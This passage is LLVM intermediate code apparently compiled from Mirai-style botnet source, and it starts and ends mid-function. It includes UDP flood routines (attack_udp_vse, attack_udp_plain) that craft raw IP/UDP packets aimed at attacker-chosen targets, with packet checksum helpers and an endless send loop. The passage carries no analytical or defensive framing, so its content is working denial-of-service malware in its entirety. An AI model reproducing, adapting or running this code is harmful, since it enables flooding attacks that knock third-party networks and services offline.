  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %192, i32 0
  %195 = bitcast %struct.sockaddr_in* %194 to %struct.sockaddr*
  %196 = call i64 @sendto(i32 %37, i8* %139, i64 60, i32 16384, %struct.sockaddr* %195, i32 16) #10
  %197 = load i32, i32* %5, align 4
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %5, align 4
  %199 = icmp slt i32 %198, %43
  br i1 %199, label %.lr.ph, label %.loopexit.loopexit

; <label>:200:                                    ; preds = %4, %64
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 54)
  %22 = call i8* @table_retrieve_val(i32 54, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %147, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #10
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %32, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br label %41

; <label>:32:                                     ; preds = %25
  %33 = call i32 @close(i32 %23) #10
  br label %147

.preheader.loopexit:                              ; preds = %63
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader71
  %34 = icmp eq i8 %0, 0
  %35 = and i32 %12, 65535
  %36 = icmp eq i32 %35, 65535
  %37 = and i32 %18, 65535
  %38 = icmp eq i32 %37, 65535
  %39 = and i32 %20, 65535
  %40 = icmp eq i32 %39, 65535
  br label %.loopexit

; <label>:41:                                     ; preds = %.lr.ph73, %63
  %42 = call noalias i8* @calloc(i64 128, i64 1) #10
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8*, i8** %9, i64 %44
  store i8* %42, i8** %45, align 8
  %46 = getelementptr inbounds i8, i8* %42, i64 20
  %47 = getelementptr inbounds i8, i8* %42, i64 28
  store i8 69, i8* %42, align 4
  %48 = getelementptr inbounds i8, i8* %42, i64 1
  store i8 %11, i8* %48, align 1
  %49 = load i32, i32* %6, align 4
  %50 = trunc i32 %49 to i16
  %51 = add i16 %50, 32
  %52 = call zeroext i16 @htons(i16 zeroext %51) #11
  %53 = getelementptr inbounds i8, i8* %42, i64 2
  %54 = bitcast i8* %53 to i16*
  store i16 %52, i16* %54, align 2
  %55 = call zeroext i16 @htons(i16 zeroext %13) #11
  %56 = getelementptr inbounds i8, i8* %42, i64 4
  %57 = bitcast i8* %56 to i16*
  store i16 %55, i16* %57, align 4
  %58 = getelementptr inbounds i8, i8* %42, i64 8
  store i8 %15, i8* %58, align 4
  br i1 %31, label %63, label %59

; <label>:59:                                     ; preds = %41
  %60 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %61 = getelementptr inbounds i8, i8* %42, i64 6
  %62 = bitcast i8* %61 to i16*
  store i16 %60, i16* %62, align 2
  br label %63

; <label>:63:                                     ; preds = %41, %59
  %64 = getelementptr inbounds i8, i8* %42, i64 9
  store i8 17, i8* %64, align 1
  %65 = load i32, i32* @LOCAL_ADDR, align 4
  %66 = getelementptr inbounds i8, i8* %42, i64 12
  %67 = bitcast i8* %66 to i32*
  store i32 %65, i32* %67, align 4
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds i8, i8* %42, i64 16
  %73 = bitcast i8* %72 to i32*
  store i32 %71, i32* %73, align 4
  %74 = call zeroext i16 @htons(i16 zeroext %19) #11
  %75 = bitcast i8* %46 to i16*
  store i16 %74, i16* %75, align 2
  %76 = call zeroext i16 @htons(i16 zeroext %21) #11
  %77 = getelementptr inbounds i8, i8* %42, i64 22
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = load i32, i32* %6, align 4
  %80 = trunc i32 %79 to i16
  %81 = add i16 %80, 12
  %82 = call zeroext i16 @htons(i16 zeroext %81) #11
  %83 = getelementptr inbounds i8, i8* %42, i64 24
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = bitcast i8* %47 to i32*
  store i32 -1, i32* %85, align 4
  %86 = getelementptr inbounds i8, i8* %42, i64 32
  %87 = load i32, i32* %6, align 4
  call void @util_memcpy(i8* %86, i8* %22, i32 %87)
  %88 = load i32, i32* %5, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %5, align 4
  %90 = icmp slt i32 %89, %29
  br i1 %90, label %41, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %117
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %34, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %117
  %storemerge7072 = phi i32 [ %145, %117 ], [ 0, %.lr.ph.preheader ]
  %91 = sext i32 %storemerge7072 to i64
  %92 = getelementptr inbounds i8*, i8** %9, i64 %91
  %93 = load i8*, i8** %92, align 8
  %94 = bitcast i8* %93 to %struct.iphdr*
  %95 = getelementptr inbounds i8, i8* %93, i64 20
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 2
  %97 = load i8, i8* %96, align 4
  %98 = icmp ult i8 %97, 32
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %.lr.ph
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @ntohl(i32 %101) #11
  %103 = call i32 @htonl(i32 %102) #11
  %104 = getelementptr inbounds i8, i8* %93, i64 16
  %105 = bitcast i8* %104 to i32*
  store i32 %103, i32* %105, align 4
  br label %106

; <label>:106:                                    ; preds = %99, %.lr.ph
  br i1 %36, label %107, label %110

; <label>:107:                                    ; preds = %106
  %108 = getelementptr inbounds i8, i8* %93, i64 4
  %109 = bitcast i8* %108 to i16*
  store i16 0, i16* %109, align 4
  br label %110

; <label>:110:                                    ; preds = %107, %106
  br i1 %38, label %111, label %113

; <label>:111:                                    ; preds = %110
  %112 = bitcast i8* %95 to i16*
  store i16 0, i16* %112, align 2
  br label %113

; <label>:113:                                    ; preds = %111, %110
  br i1 %40, label %114, label %117

; <label>:114:                                    ; preds = %113
  %115 = getelementptr inbounds i8, i8* %93, i64 22
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br label %117

; <label>:117:                                    ; preds = %114, %113
  %118 = getelementptr inbounds i8, i8* %93, i64 10
  %119 = bitcast i8* %118 to i16*
  store i16 0, i16* %119, align 2
  %120 = bitcast i8* %93 to i16*
  %121 = call zeroext i16 @checksum_generic(i16* %120, i32 20)
  store i16 %121, i16* %119, align 2
  %122 = getelementptr inbounds i8, i8* %93, i64 26
  %123 = bitcast i8* %122 to i16*
  store i16 0, i16* %123, align 2
  %124 = getelementptr inbounds i8, i8* %93, i64 24
  %125 = bitcast i8* %124 to i16*
  %126 = load i16, i16* %125, align 2
  %127 = load i32, i32* %6, align 4
  %128 = add i32 %127, 12
  %129 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %94, i8* %95, i16 zeroext %126, i32 %128)
  store i16 %129, i16* %123, align 2
  %130 = getelementptr inbounds i8, i8* %93, i64 22
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = load i32, i32* %5, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %134, i32 0, i32 1
  store i16 %132, i16* %135, align 2
  %136 = load i32, i32* %6, align 4
  %137 = sext i32 %136 to i64
  %138 = add nsw i64 %137, 32
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %140, i32 0
  %142 = bitcast %struct.sockaddr_in* %141 to %struct.sockaddr*
  %143 = call i64 @sendto(i32 %23, i8* %93, i64 %138, i32 16384, %struct.sockaddr* %142, i32 16) #10
  %144 = load i32, i32* %5, align 4
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %5, align 4
  %146 = icmp slt i32 %145, %29
  br i1 %146, label %.lr.ph, label %.loopexit.loopexit

; <label>:147:                                    ; preds = %4, %32
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %59
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %59
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %59 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #11
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = load i32, i32* %44, align 4
  %49 = call i32 @bind(i32 %48, %struct.sockaddr* nonnull %31, i32 16) #10
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %51 = load i8, i8* %50, align 4
  %52 = icmp ult i8 %51, 32
  br i1 %52, label %53, label %59

; <label>:53:                                     ; preds = %47
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @ntohl(i32 %55) #11
  %57 = call i32 @htonl(i32 %56) #11
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %57, i32* %58, align 4
  br label %59

; <label>:59:                                     ; preds = %53, %47
  %60 = load i32, i32* %44, align 4
  %61 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %62 = call i32 @connect(i32 %60, %struct.sockaddr* %61, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %63 = icmp slt i64 %indvars.iv.next, %32
  br i1 %63, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %64 = icmp eq i8 %16, 0
  %65 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %70
  %.160 = phi i32 [ %.mux, %70 ], [ 0, %.lr.ph.preheader ]
  %66 = sext i32 %.160 to i64
  %67 = getelementptr inbounds i8*, i8** %8, i64 %66
  %68 = load i8*, i8** %67, align 8
  br i1 %64, label %70, label %69

; <label>:69:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %68, i32 %65)
  br label %70

; <label>:70:                                     ; preds = %.lr.ph, %69
  %71 = getelementptr inbounds i32, i32* %10, i64 %66
  %72 = load i32, i32* %71, align 4
  %73 = call i64 @send(i32 %72, i8* %68, i64 %34, i32 16384) #10
  %74 = add nsw i32 %.160, 1
  %75 = icmp slt i32 %74, %24
  %brmerge = or i1 %75, %33
  %.mux = select i1 %75, i32 %74, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %70
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.015.prol = phi i64 [ %11, %.lr.ph.prol ], [ 0, %.lr.ph.prol.preheader ]
  %.01114.prol = phi i32 [ %12, %.lr.ph.prol ], [ %1, %.lr.ph.prol.preheader ]
  %.01213.prol = phi i16* [ %8, %.lr.ph.prol ], [ %0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01213.prol, i64 1
  %9 = load i16, i16* %.01213.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.015.prol
  %12 = add i32 %.01114.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !3

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %.015.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01114.unr = phi i32 [ %1, %.lr.ph.preheader ], [ %12, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01213.unr = phi i16* [ %0, %.lr.ph.preheader ], [ %8, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.lcssa.unr = phi i64 [ undef, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %.015 = phi i64 [ %.015.unr, %.lr.ph.preheader.new ], [ %29, %.lr.ph ]
  %.01114 = phi i32 [ %.01114.unr, %.lr.ph.preheader.new ], [ %30, %.lr.ph ]
  %.01213 = phi i16* [ %.01213.unr, %.lr.ph.preheader.new ], [ %26, %.lr.ph ]
  %14 = getelementptr inbounds i16, i16* %.01213, i64 1
  %15 = load i16, i16* %.01213, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.015
  %18 = getelementptr inbounds i16, i16* %.01213, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01213, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01213, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add i32 %.01114, -8
  %31 = icmp ugt i32 %30, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit.unr-lcssa

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.lcssa = phi i64 [ %.lcssa.unr, %.lr.ph.prol.loopexit ], [ %29, %._crit_edge.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %33 = icmp eq i32 %.011.lcssa, 1
  br i1 %33, label %34, label %39

; <label>:34:                                     ; preds = %._crit_edge
  %35 = load i16, i16* %.012.lcssa, align 2
  %36 = zext i16 %35 to i64
  %sext = shl i64 %36, 56
  %37 = ashr exact i64 %sext, 56
  %38 = add i64 %37, %.0.lcssa
  br label %39

; <label>:39:                                     ; preds = %34, %._crit_edge
  %.1 = phi i64 [ %38, %34 ], [ %.0.lcssa, %._crit_edge ]
  %40 = lshr i64 %.1, 16
  %41 = and i64 %.1, 65535
  %42 = add nuw nsw i64 %40, %41
  %43 = lshr i64 %42, 16
  %44 = add nuw nsw i64 %43, %42
  %45 = trunc i64 %44 to i16
  %46 = xor i16 %45, -1
  ret i16 %46
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #7 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %19 = add nuw i32 %18, 1
  %xtraiter = and i32 %19, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph33.prol.loopexit, label %.lr.ph33.prol.preheader

.lr.ph33.prol.preheader:                          ; preds = %.lr.ph33.preheader
  br label %.lr.ph33.prol

.lr.ph33.prol:                                    ; preds = %.lr.ph33.prol, %.lr.ph33.prol.preheader
  %.031.prol = phi i32 [ %24, %.lr.ph33.prol ], [ %3, %.lr.ph33.prol.preheader ]
  %.02630.prol = phi i32 [ %22, %.lr.ph33.prol ], [ 0, %.lr.ph33.prol.preheader ]
  %.02729.prol = phi i16* [ %23, %.lr.ph33.prol ], [ %10, %.lr.ph33.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph33.prol ], [ %xtraiter, %.lr.ph33.prol.preheader ]
  %20 = load i16, i16* %.02729.prol, align 2
  %21 = zext i16 %20 to i32
  %22 = add i32 %21, %.02630.prol
  %23 = getelementptr inbounds i16, i16* %.02729.prol, i64 1
  %24 = add nsw i32 %.031.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph33.prol.loopexit.unr-lcssa, label %.lr.ph33.prol, !llvm.loop !5

.lr.ph33.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph33.prol
  br label %.lr.ph33.prol.loopexit

.lr.ph33.prol.loopexit:                           ; preds = %.lr.ph33.preheader, %.lr.ph33.prol.loopexit.unr-lcssa
  %.031.unr = phi i32 [ %3, %.lr.ph33.preheader ], [ %24, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02630.unr = phi i32 [ 0, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02729.unr = phi i16* [ %10, %.lr.ph33.preheader ], [ %23, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.lcssa44.unr = phi i32 [ undef, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %25 = icmp ult i32 %17, 6
  br i1 %25, label %._crit_edge34.loopexit, label %.lr.ph33.preheader.new

.lr.ph33.preheader.new:                           ; preds = %.lr.ph33.prol.loopexit
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33, %.lr.ph33.preheader.new
  %.031 = phi i32 [ %.031.unr, %.lr.ph33.preheader.new ], [ %42, %.lr.ph33 ]
  %.02630 = phi i32 [ %.02630.unr, %.lr.ph33.preheader.new ], [ %40, %.lr.ph33 ]
  %.02729 = phi i16* [ %.02729.unr, %.lr.ph33.preheader.new ], [ %41, %.lr.ph33 ]
  %26 = load i16, i16* %.02729, align 2
  %27 = zext i16 %26 to i32
  %28 = add i32 %27, %.02630
  %29 = getelementptr inbounds i16, i16* %.02729, i64 1
  %30 = load i16, i16* %29, align 2
  %31 = zext i16 %30 to i32
  %32 = add i32 %31, %28
  %33 = getelementptr inbounds i16, i16* %.02729, i64 2
  %34 = load i16, i16* %33, align 2
  %35 = zext i16 %34 to i32
  %36 = add i32 %35, %32
  %37 = getelementptr inbounds i16, i16* %.02729, i64 3
  %38 = load i16, i16* %37, align 2
  %39 = zext i16 %38 to i32
  %40 = add i32 %39, %36
  %41 = getelementptr inbounds i16, i16* %.02729, i64 4
  %42 = add nsw i32 %.031, -8
  %43 = icmp sgt i32 %42, 1
  br i1 %43, label %.lr.ph33, label %._crit_edge34.loopexit.unr-lcssa

._crit_edge34.loopexit.unr-lcssa:                 ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %.lr.ph33.prol.loopexit, %._crit_edge34.loopexit.unr-lcssa
  %.lcssa44 = phi i32 [ %.lcssa44.unr, %.lr.ph33.prol.loopexit ], [ %40, %._crit_edge34.loopexit.unr-lcssa ]
  %44 = add i32 %3, -2
  %45 = sub i32 %44, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %46 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa44, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %45, %._crit_edge34.loopexit ]
  %47 = icmp eq i32 %.0.lcssa, 1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %._crit_edge34
  %49 = load i8, i8* %46, align 1
  %50 = zext i8 %49 to i32
  %51 = add i32 %50, %.026.lcssa
  br label %52

; <label>:52:                                     ; preds = %48, %._crit_edge34
  %.1 = phi i32 [ %51, %48 ], [ %.026.lcssa, %._crit_edge34 ]
  %53 = lshr i32 %6, 16
  %54 = and i32 %6, 65535
  %55 = lshr i32 %8, 16
  %56 = and i32 %8, 65535
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i16
  %60 = tail call zeroext i16 @htons(i16 zeroext %59) #11
  %61 = zext i16 %60 to i32
  %62 = zext i16 %2 to i32
  %63 = add nuw nsw i32 %53, %62
  %64 = add nuw nsw i32 %63, %54
  %65 = add nuw nsw i32 %64, %55
  %66 = add nuw nsw i32 %65, %56
  %67 = add i32 %66, %.1
  %68 = add i32 %67, %61
  %69 = lshr i32 %68, 16
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %71 = phi i32 [ %74, %.lr.ph ], [ %69, %.lr.ph.preheader ]
  %.228 = phi i32 [ %73, %.lr.ph ], [ %68, %.lr.ph.preheader ]
  %72 = and i32 %.228, 65535
  %73 = add nuw nsw i32 %72, %71
  %74 = lshr i32 %73, 16
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %.2.lcssa = phi i32 [ %68, %52 ], [ %73, %._crit_edge.loopexit ]
  %76 = trunc i32 %.2.lcssa to i16
  %77 = xor i16 %76, -1
  ret i16 %77
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #8 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #9 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

